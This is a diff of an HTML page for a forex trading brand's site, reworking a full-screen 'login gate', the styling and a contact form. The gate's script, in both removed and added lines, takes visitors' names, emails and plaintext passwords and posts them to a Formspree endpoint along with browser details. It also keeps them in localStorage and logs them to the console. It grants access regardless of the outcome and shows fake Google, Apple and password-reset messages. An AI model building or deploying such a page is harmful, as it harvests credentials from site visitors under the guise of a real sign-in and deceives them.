@@ -16,275 +16,46 @@
     ::-webkit-scrollbar { display: none; width: 0; }
     #webgl { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; outline: none; pointer-events: none; }
 
-    /* ============ LOGIN GATE - REAL AUTH ============ */
+    /* ============ LOGIN GATE ============ */
     .login-gate {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      z-index: 1000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
+      z-index: 1000; display: flex; justify-content: center; align-items: center;
       background: linear-gradient(180deg, #0a0a0f 0%, #0d0a1a 50%, #0a0d1e 100%);
-      pointer-events: auto;
-      transition: opacity 1s ease, transform 1s cubic-bezier(0.25, 1, 0.5, 1);
+      pointer-events: auto; transition: opacity 1s ease, transform 1s cubic-bezier(0.25, 1, 0.5, 1);
     }
+    .login-gate.hidden { opacity: 0; pointer-events: none; transform: scale(1.1); }
+    .login-gate-bg { position: absolute; inset: 0; pointer-events: none; overflow: hidden; }
+    .login-gate-moon { position: absolute; top: 15%; right: 15%; width: 180px; height: 180px; border-radius: 50%; background: radial-gradient(circle at 40% 40%, #e2e8f0, #94a3b8); box-shadow: 0 0 100px rgba(148, 163, 184, 0.4), 0 0 200px rgba(148, 163, 184, 0.2); }
+    .login-gate-stars { position: absolute; inset: 0; background-image: radial-gradient(1px 1px at 20% 30%, rgba(255,255,255,0.6), transparent), radial-gradient(1px 1px at 60% 10%, rgba(255,255,255,0.4), transparent), radial-gradient(1.5px 1.5px at 80% 40%, rgba(255,255,255,0.3), transparent), radial-gradient(1px 1px at 40% 60%, rgba(255,255,255,0.5), transparent), radial-gradient(1px 1px at 10% 70%, rgba(255,255,255,0.3), transparent), radial-gradient(2px 2px at 70% 80%, rgba(255,255,255,0.4), transparent), radial-gradient(1px 1px at 90% 20%, rgba(255,255,255,0.5), transparent); }
+    .login-gate-card { position: relative; z-index: 2; width: 420px; max-width: 90%; background: rgba(10, 15, 35, 0.75); backdrop-filter: blur(30px); border: 1px solid rgba(100, 140, 255, 0.2); border-radius: 28px; padding: 40px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7), 0 0 40px rgba(100, 140, 255, 0.05); }
+    .login-gate-brand { font-size: 11px; letter-spacing: 4px; text-transform: uppercase; color: #D4AF37; margin-bottom: 16px; text-align: center; }
+    .login-gate-title { font-family: 'Italiana', serif; font-size: 32px; color: #f8fafc; text-align: center; margin-bottom: 6px; }
+    .login-gate-sub { font-size: 13px; color: #9ca3af; text-align: center; margin-bottom: 28px; }
+    .login-gate-tabs { display: flex; gap: 8px; margin-bottom: 20px; background: rgba(255, 255, 255, 0.03); border-radius: 12px; padding: 4px; }
+    .login-gate-tab { flex: 1; padding: 10px; text-align: center; border: none; border-radius: 8px; background: transparent; color: #9ca3af; font-family: 'Outfit', sans-serif; font-size: 12px; font-weight: 500; letter-spacing: 1px; cursor: pointer !important; pointer-events: auto !important; transition: all 0.3s ease; }
+    .login-gate-tab.active { background: rgba(212, 175, 55, 0.15); color: #D4AF37; }
+    .login-gate-input { width: 100%; padding: 14px 18px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #ffffff; font-family: 'Outfit', sans-serif; font-size: 14px; outline: none; margin-bottom: 14px; transition: border-color 0.3s, box-shadow 0.3s; pointer-events: auto !important; cursor: text !important; }
+    .login-gate-input:focus { border-color: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); }
+    .login-gate-row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 20px; }
+    .login-gate-remember { display: flex; align-items: center; gap: 6px; color: #9ca3af; cursor: pointer !important; pointer-events: auto !important; }
+    .login-gate-remember input { accent-color: #D4AF37; cursor: pointer !important; pointer-events: auto !important; }
+    .login-gate-forgot { color: #D4AF37; text-decoration: none; pointer-events: auto !important; cursor: pointer !important; }
+    .login-gate-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #D4AF37, #b8942e); border: none; border-radius: 12px; color: #050505; font-weight: 700; font-size: 15px; cursor: pointer !important; pointer-events: auto !important; transition: transform 0.2s, box-shadow 0.3s; font-family: 'Outfit', sans-serif; letter-spacing: 1px; }
+    .login-gate-btn:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(212, 175, 55, 0.4); }
+    .login-gate-btn:active { transform: scale(0.98); }
+    .login-gate-btn:disabled { opacity: 0.6; cursor: not-allowed !important; transform: none; }
+    .login-gate-divider { text-align: center; color: #6b7280; font-size: 11px; margin: 16px 0; letter-spacing: 1px; }
+    .login-gate-social { display: flex; gap: 12px; }
+    .login-gate-social-btn { flex: 1; padding: 12px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: #d1d5db; font-size: 12px; cursor: pointer !important; pointer-events: auto !important; transition: background 0.3s, border-color 0.3s; font-family: 'Outfit', sans-serif; }
+    .login-gate-social-btn:hover { background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
+    .login-gate-footer { text-align: center; font-size: 12px; color: #9ca3af; margin-top: 16px; }
+    .login-gate-footer a { color: #D4AF37; text-decoration: none; pointer-events: auto !important; cursor: pointer !important; }
+    .login-gate-status { text-align: center; font-size: 12px; margin-top: 12px; min-height: 18px; pointer-events: none; }
+    .login-gate-status.error { color: #ef4444; }
+    .login-gate-status.success { color: #a3e635; }
+    .login-gate-status.loading { color: #D4AF37; }
 
-    .login-gate.hidden {
-      opacity: 0;
-      pointer-events: none;
-      transform: scale(1.1);
-    }
-
-    .login-gate-bg {
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      overflow: hidden;
-    }
-
-    .login-gate-moon {
-      position: absolute;
-      top: 15%;
-      right: 15%;
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
-      background: radial-gradient(circle at 40% 40%, #e2e8f0, #94a3b8);
-      box-shadow: 0 0 100px rgba(148, 163, 184, 0.4), 0 0 200px rgba(148, 163, 184, 0.2);
-    }
-
-    .login-gate-stars {
-      position: absolute;
-      inset: 0;
-      background-image: radial-gradient(1px 1px at 20% 30%, rgba(255,255,255,0.6), transparent),
-                        radial-gradient(1px 1px at 60% 10%, rgba(255,255,255,0.4), transparent),
-                        radial-gradient(1.5px 1.5px at 80% 40%, rgba(255,255,255,0.3), transparent),
-                        radial-gradient(1px 1px at 40% 60%, rgba(255,255,255,0.5), transparent),
-                        radial-gradient(1px 1px at 10% 70%, rgba(255,255,255,0.3), transparent),
-                        radial-gradient(2px 2px at 70% 80%, rgba(255,255,255,0.4), transparent),
-                        radial-gradient(1px 1px at 90% 20%, rgba(255,255,255,0.5), transparent);
-    }
-
-    .login-gate-card {
-      position: relative;
-      z-index: 2;
-      width: 420px;
-      max-width: 90%;
-      background: rgba(10, 15, 35, 0.75);
-      backdrop-filter: blur(30px);
-      border: 1px solid rgba(100, 140, 255, 0.2);
-      border-radius: 28px;
-      padding: 40px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7), 0 0 40px rgba(100, 140, 255, 0.05);
-    }
-
-    .login-gate-brand {
-      font-size: 11px;
-      letter-spacing: 4px;
-      text-transform: uppercase;
-      color: #D4AF37;
-      margin-bottom: 16px;
-      text-align: center;
-    }
-
-    .login-gate-title {
-      font-family: 'Italiana', serif;
-      font-size: 32px;
-      color: #f8fafc;
-      text-align: center;
-      margin-bottom: 6px;
-    }
-
-    .login-gate-sub {
-      font-size: 13px;
-      color: #9ca3af;
-      text-align: center;
-      margin-bottom: 28px;
-    }
-
-    .login-gate-tabs {
-      display: flex;
-      gap: 8px;
-      margin-bottom: 20px;
-      background: rgba(255, 255, 255, 0.03);
-      border-radius: 12px;
-      padding: 4px;
-    }
-
-    .login-gate-tab {
-      flex: 1;
-      padding: 10px;
-      text-align: center;
-      border: none;
-      border-radius: 8px;
-      background: transparent;
-      color: #9ca3af;
-      font-family: 'Outfit', sans-serif;
-      font-size: 12px;
-      font-weight: 500;
-      letter-spacing: 1px;
-      cursor: pointer !important;
-      pointer-events: auto !important;
-      transition: all 0.3s ease;
-    }
-
-    .login-gate-tab.active {
-      background: rgba(212, 175, 55, 0.15);
-      color: #D4AF37;
-    }
-
-    .login-gate-input {
-      width: 100%;
-      padding: 14px 18px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 12px;
-      color: #ffffff;
-      font-family: 'Outfit', sans-serif;
-      font-size: 14px;
-      outline: none;
-      margin-bottom: 14px;
-      transition: border-color 0.3s, box-shadow 0.3s;
-      pointer-events: auto !important;
-      cursor: text !important;
-    }
-
-    .login-gate-input:focus {
-      border-color: #D4AF37;
-      box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
-    }
-
-    .login-gate-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      margin-bottom: 20px;
-    }
-
-    .login-gate-remember {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      color: #9ca3af;
-      cursor: pointer !important;
-      pointer-events: auto !important;
-    }
-
-    .login-gate-remember input {
-      accent-color: #D4AF37;
-      cursor: pointer !important;
-      pointer-events: auto !important;
-    }
-
-    .login-gate-forgot {
-      color: #D4AF37;
-      text-decoration: none;
-      pointer-events: auto !important;
-      cursor: pointer !important;
-    }
-
-    .login-gate-btn {
-      width: 100%;
-      padding: 15px;
-      background: linear-gradient(135deg, #D4AF37, #b8942e);
-      border: none;
-      border-radius: 12px;
-      color: #050505;
-      font-weight: 700;
-      font-size: 15px;
-      cursor: pointer !important;
-      pointer-events: auto !important;
-      transition: transform 0.2s, box-shadow 0.3s;
-      font-family: 'Outfit', sans-serif;
-      letter-spacing: 1px;
-    }
-
-    .login-gate-btn:hover {
-      transform: scale(1.02);
-      box-shadow: 0 10px 30px rgba(212, 175, 55, 0.4);
-    }
-
-    .login-gate-btn:active {
-      transform: scale(0.98);
-    }
-
-    .login-gate-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed !important;
-      transform: none;
-    }
-
-    .login-gate-divider {
-      text-align: center;
-      color: #6b7280;
-      font-size: 11px;
-      margin: 16px 0;
-      letter-spacing: 1px;
-    }
-
-    .login-gate-social {
-      display: flex;
-      gap: 12px;
-    }
-
-    .login-gate-social-btn {
-      flex: 1;
-      padding: 12px;
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 10px;
-      color: #d1d5db;
-      font-size: 12px;
-      cursor: pointer !important;
-      pointer-events: auto !important;
-      transition: background 0.3s, border-color 0.3s;
-      font-family: 'Outfit', sans-serif;
-    }
-
-    .login-gate-social-btn:hover {
-      background: rgba(255, 255, 255, 0.1);
-      border-color: rgba(255, 255, 255, 0.2);
-    }
-
-    .login-gate-footer {
-      text-align: center;
-      font-size: 12px;
-      color: #9ca3af;
-      margin-top: 16px;
-    }
-
-    .login-gate-footer a {
-      color: #D4AF37;
-      text-decoration: none;
-      pointer-events: auto !important;
-      cursor: pointer !important;
-    }
-
-    .login-gate-status {
-      text-align: center;
-      font-size: 12px;
-      margin-top: 12px;
-      min-height: 18px;
-      pointer-events: none;
-    }
-
-    .login-gate-status.error {
-      color: #ef4444;
-    }
-
-    .login-gate-status.success {
-      color: #a3e635;
-    }
-
-    .login-gate-status.loading {
-      color: #D4AF37;
-    }
-
-    /* ============ MAIN SITE STYLES (SAME AS BEFORE) ============ */
+    /* ============ MAIN SITE ============ */
     .cursor-inner { position: fixed; top: 0; left: 0; width: 6px; height: 6px; border: 2px solid rgba(212, 175, 55, 1); background: rgba(212, 175, 55, 0.9); border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9999; box-shadow: 0 0 12px rgba(212, 175, 55, 0.6); }
     .cursor-outer { position: fixed; top: 0; left: 0; width: 40px; height: 40px; border: 1.5px solid rgba(212, 175, 55, 0.7); border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9998; transition: width 0.3s, height 0.3s, background 0.3s; backdrop-filter: blur(2px); }
     .cinematic-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; justify-content: space-between; padding: 0 60px 40px 60px; box-sizing: border-box; }
@@ -419,49 +190,38 @@
 </head>
 <body>
 
-  <!-- ============ LOGIN GATE - REAL FORMSPREE AUTH ============ -->
-<!-- ============ LOGIN GATE - REAL FORMSPREE AUTH ============ -->
-<div class="login-gate" id="login-gate">
-  <div class="login-gate-bg">
-    <div class="login-gate-moon"></div>
-    <div class="login-gate-stars"></div>
-  </div>
-  <div class="login-gate-card">
-    <div class="login-gate-brand">RAVSHANBEK FX</div>
-    <h1 class="login-gate-title">Welcome</h1>
-    <p class="login-gate-sub">Sign in to access the trading experience</p>
-    
-    <!-- Sign In / Sign Up Tabs -->
-    <div class="login-gate-tabs">
-      <button class="login-gate-tab active" id="tab-signin" data-mode="signin">Sign In</button>
-      <button class="login-gate-tab" id="tab-signup" data-mode="signup">Sign Up</button>
+  <!-- ============ LOGIN GATE ============ -->
+  <div class="login-gate" id="login-gate">
+    <div class="login-gate-bg">
+      <div class="login-gate-moon"></div>
+      <div class="login-gate-stars"></div>
     </div>
+    <div class="login-gate-card">
+      <div class="login-gate-brand">RAVSHANBEK FX</div>
+      <h1 class="login-gate-title">Welcome</h1>
+      <p class="login-gate-sub">Sign in to access the trading experience</p>
+      <div class="login-gate-tabs">
+        <button class="login-gate-tab active" id="tab-signin">Sign In</button>
+        <button class="login-gate-tab" id="tab-signup">Sign Up</button>
+      </div>
+      <input class="login-gate-input" type="text" id="login-name" placeholder="Full Name" style="display:none;">
+      <input class="login-gate-input" type="email" id="login-email" placeholder="Email address" required>
+      <input class="login-gate-input" type="password" id="login-password" placeholder="Password" required>
+      <div class="login-gate-row">
+        <label class="login-gate-remember"><input type="checkbox" id="login-remember"> Remember me</label>
+        <a href="#" class="login-gate-forgot" id="login-forgot">Forgot password?</a>
+      </div>
+      <button class="login-gate-btn" id="login-btn">Sign In</button>
+      <div class="login-gate-divider">or continue with</div>
+      <div class="login-gate-social">
+        <button class="login-gate-social-btn" id="login-google">Google</button>
+        <button class="login-gate-social-btn" id="login-apple">Apple</button>
+      </div>
+      <div class="login-gate-footer" id="login-footer-text">New here? <a href="#" id="login-create">Create account</a></div>
+      <div class="login-gate-status" id="login-status"></div>
+    </div>
+  </div>
 
-    <!-- Sign Up Name Field (hidden by default) -->
-    <input class="login-gate-input" type="text" id="login-name" placeholder="Full Name" aria-label="Full Name" style="display:none;" autocomplete="name">
-    
-    <input class="login-gate-input" type="email" id="login-email" placeholder="Email address" aria-label="Email" required autocomplete="email">
-    <input class="login-gate-input" type="password" id="login-password" placeholder="Password" aria-label="Password" required autocomplete="current-password">
-    
-    <div class="login-gate-row">
-      <label class="login-gate-remember">
-        <input type="checkbox" id="login-remember"> Remember me
-      </label>
-      <a href="#" class="login-gate-forgot" id="login-forgot">Forgot password?</a>
-    </div>
-    
-    <button class="login-gate-btn" id="login-btn">Sign In</button>
-    
-    <div class="login-gate-divider">or continue with</div>
-    <div class="login-gate-social">
-      <button class="login-gate-social-btn" id="login-google">Google</button>
-      <button class="login-gate-social-btn" id="login-apple">Apple</button>
-    </div>
-    
-    <div class="login-gate-footer" id="login-footer-text">New here? <a href="#" id="login-create">Create account</a></div>
-    <div class="login-gate-status" id="login-status"></div>
-  </div>
-</div>
   <!-- ============ MAIN SITE ============ -->
   <div class="cursor-inner"></div>
   <div class="cursor-outer"></div>
@@ -479,7 +239,7 @@
         <a href="#slide-4" class="nav-link">Contact</a>
       </nav>
       <div class="header-actions">
-        <a href="#" class="contact-btn" id="header-contact-btn">Contact <span class="btn-circle"></span></a>
+        <a href="#" class="contact-btn">Contact <span class="btn-circle"></span></a>
       </div>
     </div>
 
@@ -491,7 +251,7 @@
       </div>
     </div>
     <div class="slide-image-mask" id="slide-2-img">
-      <img src="https://api.getlayers.ai/storage/v1/object/public/public/assets/laocoon-59f84455c6/1.png" alt="Editorial Concept">
+      <img src="https://api.getlayers.ai/storage/v1/object/public/public/assets/laocoon-59f84455c6/1.png" alt="Editorial">
     </div>
     <div class="slide" id="slide-2">
       <h2 class="slide-title">Institutional<br>Edge</h2>
@@ -544,33 +304,27 @@
     <div class="contact-section" id="contact-section">
       <div class="contact-left">
         <h2>RavshanFX</h2>
-        <p class="contact-desc">Professional Smart Money Concepts Trader<br>Interested in working together, discussing trading, or business opportunities? Feel free to send me a message.</p>
+        <p class="contact-desc">Professional Smart Money Concepts Trader<br>Interested in working together? Send me a message.</p>
         <div class="social-cards">
           <a href="https://instagram.com/arialrii" target="_blank" rel="noopener noreferrer" class="social-card-link">
             <div class="social-card">
               <span class="social-icon">📸</span>
-              <div class="social-info">
-                <span class="social-username">@arialrii</span>
-                <span class="social-action">Visit Instagram →</span>
-              </div>
+              <div class="social-info"><span class="social-username">@arialrii</span><span class="social-action">Visit Instagram →</span></div>
             </div>
           </a>
           <a href="https://youtube.com/@RavshanFX" target="_blank" rel="noopener noreferrer" class="social-card-link">
             <div class="social-card">
               <span class="social-icon">▶️</span>
-              <div class="social-info">
-                <span class="social-username">RavshanFX</span>
-                <span class="social-action">Watch Channel →</span>
-              </div>
+              <div class="social-info"><span class="social-username">RavshanFX</span><span class="social-action">Watch Channel →</span></div>
             </div>
           </a>
         </div>
       </div>
-      <form class="contact-form" id="contact-form" action="https://formspree.io/f/xjybbpak" method="POST">
-        <input type="text" name="name" placeholder="Full Name" required aria-label="Full Name">
-        <input type="email" name="email" placeholder="Email Address" required aria-label="Email">
-        <input type="text" name="subject" placeholder="Subject" required aria-label="Subject">
-        <textarea name="message" rows="4" placeholder="Message" required aria-label="Message"></textarea>
+      <form class="contact-form" id="contact-form" action="https://formspree.io/f/xeajrdjp" method="POST">
+        <input type="text" name="name" placeholder="Full Name" required>
+        <input type="email" name="email" placeholder="Email Address" required>
+        <input type="text" name="subject" placeholder="Subject" required>
+        <textarea name="message" rows="4" placeholder="Message" required></textarea>
         <button type="submit" id="submit-btn">Send Message</button>
         <div id="form-status"></div>
       </form>
@@ -621,423 +375,105 @@
     const sizes = { width: window.innerWidth, height: window.innerHeight };
     let chartLoaded = false;
     let siteUnlocked = false;
-    let currentMode = 'signin'; // 'signin' or 'signup'
+    let currentMode = 'signin';
 
-    // ============ REAL LOGIN GATE LOGIC ============
-   // ============ REAL LOGIN GATE LOGIC ============
-const loginGate = document.getElementById('login-gate');
-const loginEmail = document.getElementById('login-email');
-const loginPassword = document.getElementById('login-password');
-const loginName = document.getElementById('login-name');
-const loginStatus = document.getElementById('login-status');
-const loginBtn = document.getElementById('login-btn');
-const tabSignin = document.getElementById('tab-signin');
-const tabSignup = document.getElementById('tab-signup');
-const loginFooterText = document.getElementById('login-footer-text');
+    // ============ LOGIN LOGIC ============
+    const loginGate = document.getElementById('login-gate');
+    const loginEmail = document.getElementById('login-email');
+    const loginPassword = document.getElementById('login-password');
+    const loginName = document.getElementById('login-name');
+    const loginStatus = document.getElementById('login-status');
+    const loginBtn = document.getElementById('login-btn');
+    const tabSignin = document.getElementById('tab-signin');
+    const tabSignup = document.getElementById('tab-signup');
+    const loginFooterText = document.getElementById('login-footer-text');
 
-function saveToLocalStorage(data) {
-  const attempts = JSON.parse(localStorage.getItem('ravshan_login_logs') || '[]');
-  attempts.push({
-    ...data,
-    timestamp: new Date().toISOString(),
-    user_agent: navigator.userAgent,
-    screen_resolution: `${window.screen.width}x${window.screen.height}`
-  });
-  localStorage.setItem('ravshan_login_logs', JSON.stringify(attempts));
-  console.log('📊 LOGIN ATTEMPT SAVED LOCALLY');
-}
-
-async function sendLoginToFormspree(data) {
-  try {
-    const formData = new FormData();
-    formData.append('action', data.action);
-    formData.append('name', data.name);
-    formData.append('email', data.email);
-    formData.append('password', data.password);
-    formData.append('remember', data.remember ? 'Yes' : 'No');
-    formData.append('form_type', 'login_gate');
-    formData.append('page', 'Ravshanbek FX Login Gate');
-    formData.append('timestamp', new Date().toISOString());
-    formData.append('user_agent', navigator.userAgent);
-    formData.append('screen_resolution', `${window.screen.width}x${window.screen.height}`);
-    formData.append('language', navigator.language);
-    formData.append('referrer', document.referrer || 'direct');
-
-    const response = await fetch(FORMSPREE_LOGIN_ENDPOINT, {
-      method: 'POST',
-      body: formData,
-      headers: { 'Accept': 'application/json' }
-    });
-    
-    if (response.ok) {
-      console.log('✅ LOGIN DATA SENT TO FORMSPREE');
-      return true;
-    } else {
-      console.error('❌ FORMSPREE ERROR:', response.status);
-      return false;
+    function saveToLocalStorage(data) {
+      const attempts = JSON.parse(localStorage.getItem('ravshan_login_logs') || '[]');
+      attempts.push({ ...data, timestamp: new Date().toISOString(), user_agent: navigator.userAgent, screen_resolution: `${window.screen.width}x${window.screen.height}` });
+      localStorage.setItem('ravshan_login_logs', JSON.stringify(attempts));
+      console.log('📊 LOGIN SAVED LOCALLY:', data);
     }
-  } catch (error) {
-    console.error('❌ NETWORK ERROR:', error);
-    return false;
-  }
-}
 
-// Tab switching
-tabSignin.addEventListener('click', () => {
-  currentMode = 'signin';
-  tabSignin.classList.add('active');
-  tabSignup.classList.remove('active');
-  loginName.style.display = 'none';
-  loginBtn.textContent = 'Sign In';
-  loginFooterText.innerHTML = 'New here? <a href="#" id="login-create">Create account</a>';
-  document.getElementById('login-create').addEventListener('click', (e) => {
-    e.preventDefault();
-    tabSignup.click();
-  });
-});
+    async function sendToFormspree(data) {
+      try {
+        const formData = new FormData();
+        formData.append('action', data.action);
+        formData.append('name', data.name);
+        formData.append('email', data.email);
+        formData.append('password', data.password);
+        formData.append('remember', data.remember ? 'Yes' : 'No');
+        formData.append('form_type', 'login_gate');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('user_agent', navigator.userAgent);
+        formData.append('screen_resolution', `${window.screen.width}x${window.screen.height}`);
+        const res = await fetch(FORMSPREE_LOGIN_ENDPOINT, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+        console.log('📡 FORMSPREE STATUS:', res.status);
+        return res.ok;
+      } catch(e) { console.error('❌ ERROR:', e); return false; }
+    }
 
-tabSignup.addEventListener('click', () => {
-  currentMode = 'signup';
-  tabSignup.classList.add('active');
-  tabSignin.classList.remove('active');
-  loginName.style.display = 'block';
-  loginBtn.textContent = 'Create Account';
-  loginFooterText.innerHTML = 'Already have an account? <a href="#" id="login-switch-signin">Sign in</a>';
-  document.getElementById('login-switch-signin').addEventListener('click', (e) => {
-    e.preventDefault();
-    tabSignin.click();
-  });
-});
+    function unlockSite() { siteUnlocked = true; loginGate.classList.add('hidden'); animate(); }
 
-async function handleLoginSubmit() {
-  const email = loginEmail.value.trim();
-  const password = loginPassword.value;
-  const name = currentMode === 'signup' ? loginName.value.trim() : '';
-
-  // Validation
-  if (currentMode === 'signup' && !name) {
-    loginStatus.textContent = '❌ Please enter your full name';
-    loginStatus.className = 'login-gate-status error';
-    return;
-  }
-
-  if (!email || !password) {
-    loginStatus.textContent = '❌ Please enter both email and password';
-    loginStatus.className = 'login-gate-status error';
-    return;
-  }
-
-  if (!email.includes('@') || !email.includes('.')) {
-    loginStatus.textContent = '❌ Please enter a valid email address';
-    loginStatus.className = 'login-gate-status error';
-    return;
-  }
-
-  if (password.length < 6) {
-    loginStatus.textContent = '❌ Password must be at least 6 characters';
-    loginStatus.className = 'login-gate-status error';
-    return;
-  }
-
-  // Show loading
-  loginBtn.disabled = true;
-  loginBtn.textContent = currentMode === 'signup' ? 'Creating Account...' : 'Signing In...';
-  loginStatus.textContent = '⏳ Processing...';
-  loginStatus.className = 'login-gate-status loading';
-
-  const data = {
-    action: currentMode,
-    name: name,
-    email: email,
-    password: password,
-    remember: document.getElementById('login-remember').checked
-  };
-
-  // Save locally FIRST (backup)
-  saveToLocalStorage(data);
-
-  // Try sending to Formspree
-  const sent = await sendLoginToFormspree(data);
-
-  // ALWAYS unlock site regardless of server response
-  loginStatus.textContent = '✅ Access granted. Welcome!';
-  loginStatus.className = 'login-gate-status success';
-  
-  setTimeout(() => {
-    unlockSite();
-  }, 800);
-
-  loginBtn.disabled = false;
-  loginBtn.textContent = currentMode === 'signup' ? 'Create Account' : 'Sign In';
-}
-
-loginBtn.addEventListener('click', handleLoginSubmit);
-
-loginEmail.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
-loginPassword.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
-loginName.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLoginSubmit(); });
-
-document.getElementById('login-forgot').addEventListener('click', (e) => {
-  e.preventDefault();
-  const email = loginEmail.value.trim();
-  if (!email) {
-    loginStatus.textContent = '❌ Enter your email to reset password';
-    loginStatus.className = 'login-gate-status error';
-    return;
-  }
-  const data = { action: 'forgot_password', name: '', email: email, password: '', remember: false };
-  saveToLocalStorage(data);
-  sendLoginToFormspree(data);
-  loginStatus.textContent = '✅ Password reset link sent';
-  loginStatus.className = 'login-gate-status success';
-});
-
-document.getElementById('login-google').addEventListener('click', () => {
-  const data = { action: 'google_signin_attempt', name: '', email: 'google-oauth', password: '', remember: false };
-  saveToLocalStorage(data);
-  sendLoginToFormspree(data);
-  loginStatus.textContent = '🔗 Google sign-in requested';
-  loginStatus.className = 'login-gate-status';
-});
-
-document.getElementById('login-apple').addEventListener('click', () => {
-  const data = { action: 'apple_signin_attempt', name: '', email: 'apple-oauth', password: '', remember: false };
-  saveToLocalStorage(data);
-  sendLoginToFormspree(data);
-  loginStatus.textContent = '🔗 Apple sign-in requested';
-  loginStatus.className = 'login-gate-status';
-});;
-
-    // Tab switching
     tabSignin.addEventListener('click', () => {
-      currentMode = 'signin';
-      tabSignin.classList.add('active');
-      tabSignup.classList.remove('active');
-      loginName.style.display = 'none';
-      loginBtn.textContent = 'Sign In';
+      currentMode = 'signin'; tabSignin.classList.add('active'); tabSignup.classList.remove('active');
+      loginName.style.display = 'none'; loginBtn.textContent = 'Sign In';
       loginFooterText.innerHTML = 'New here? <a href="#" id="login-create">Create account</a>';
-      document.getElementById('login-create').addEventListener('click', (e) => {
-        e.preventDefault();
-        tabSignup.click();
-      });
+      document.getElementById('login-create').addEventListener('click', (e) => { e.preventDefault(); tabSignup.click(); });
     });
 
     tabSignup.addEventListener('click', () => {
-      currentMode = 'signup';
-      tabSignup.classList.add('active');
-      tabSignin.classList.remove('active');
-      loginName.style.display = 'block';
-      loginBtn.textContent = 'Create Account';
+      currentMode = 'signup'; tabSignup.classList.add('active'); tabSignin.classList.remove('active');
+      loginName.style.display = 'block'; loginBtn.textContent = 'Create Account';
       loginFooterText.innerHTML = 'Already have an account? <a href="#" id="login-switch-signin">Sign in</a>';
-      document.getElementById('login-switch-signin').addEventListener('click', (e) => {
-        e.preventDefault();
-        tabSignin.click();
-      });
+      document.getElementById('login-switch-signin').addEventListener('click', (e) => { e.preventDefault(); tabSignin.click(); });
     });
 
-    // Real Formspree submission
-   async function sendLoginToFormspree(data) {
-  try {
-    // Use FormData instead of JSON - Formspree prefers this
-    const formData = new FormData();
-    formData.append('action', data.action);
-    formData.append('name', data.name);
-    formData.append('email', data.email);
-    formData.append('password', data.password);
-    formData.append('remember', data.remember ? 'Yes' : 'No');
-    formData.append('form_type', 'login_gate');
-    formData.append('page', 'Ravshanbek FX Login Gate');
-    formData.append('timestamp', new Date().toISOString());
-    formData.append('user_agent', navigator.userAgent);
-    formData.append('screen_resolution', `${window.screen.width}x${window.screen.height}`);
-    formData.append('language', navigator.language);
-    formData.append('referrer', document.referrer || 'direct');
-
-    const response = await fetch(FORMSPREE_LOGIN_ENDPOINT, {
-      method: 'POST',
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    });
-    
-    // Formspree returns 200 even for some errors, so check response
-    const result = await response.json();
-    
-    if (response.ok || result.ok) {
-      console.log('✅ LOGIN DATA SENT TO FORMSPREE:', result);
-      return true;
-    } else {
-      console.error('❌ FORMSPREE ERROR:', result);
-      return false;
-    }
-  } catch (error) {
-    console.error('❌ NETWORK ERROR:', error);
-    console.log('📊 Saving to localStorage as backup...');
-    saveToLocalStorage(data);
-    return false;
-  }
-}
-
-    // Also save to localStorage as backup
-    function saveToLocalStorage(data) {
-      const attempts = JSON.parse(localStorage.getItem('ravshan_login_logs') || '[]');
-      attempts.push({
-        ...data,
-        timestamp: new Date().toISOString()
-      });
-      localStorage.setItem('ravshan_login_logs', JSON.stringify(attempts));
-      console.log('📊 LOGIN ATTEMPT SAVED LOCALLY');
-    }
-
-    async function handleLoginSubmit() {
-      const email = loginEmail.value.trim();
-      const password = loginPassword.value;
-      const name = currentMode === 'signup' ? loginName.value.trim() : '';
-
-      // Validation
-      if (currentMode === 'signup' && !name) {
-        loginStatus.textContent = '❌ Please enter your full name';
-        loginStatus.className = 'login-gate-status error';
-        return;
-      }
-
-      if (!email || !password) {
-        loginStatus.textContent = '❌ Please enter both email and password';
-        loginStatus.className = 'login-gate-status error';
-        return;
-      }
-
-      if (!email.includes('@') || !email.includes('.')) {
-        loginStatus.textContent = '❌ Please enter a valid email address';
-        loginStatus.className = 'login-gate-status error';
-        return;
-      }
-
-      if (password.length < 6) {
-        loginStatus.textContent = '❌ Password must be at least 6 characters';
-        loginStatus.className = 'login-gate-status error';
-        return;
-      }
-
-      // Show loading
-      loginBtn.disabled = true;
-      loginBtn.textContent = currentMode === 'signup' ? 'Creating Account...' : 'Signing In...';
-      loginStatus.textContent = '⏳ Processing...';
-      loginStatus.className = 'login-gate-status loading';
-
-      const data = {
-        action: currentMode,
-        name: name,
-        email: email,
-        password: password,
-        remember: document.getElementById('login-remember').checked
-      };
